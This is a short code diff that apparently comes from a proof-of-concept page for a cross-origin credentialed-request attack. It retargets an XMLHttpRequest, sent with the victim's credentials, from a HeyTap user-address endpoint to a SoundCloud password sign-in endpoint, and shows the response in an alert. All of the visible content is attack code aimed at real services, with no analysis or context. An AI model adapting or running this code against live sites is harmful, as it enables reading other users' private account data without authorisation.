@@ -9,7 +9,7 @@
                         document.getElementById("demo").innerHTML = alert(this.responseText);
             }
          };
-         xhttp.open("GET", "https://htsg-storeapi-sg.heytap.com/xman/useraddress/list-sec", true);
+         xhttp.open("POST", "https://api-auth.soundcloud.com/web-auth/sign-in/password?client_id=eQ08HWvV1IhxdY9i3Cq3UavLOuOKVi8y", true);
          xhttp.withCredentials = true;
          xhttp.send();
          }
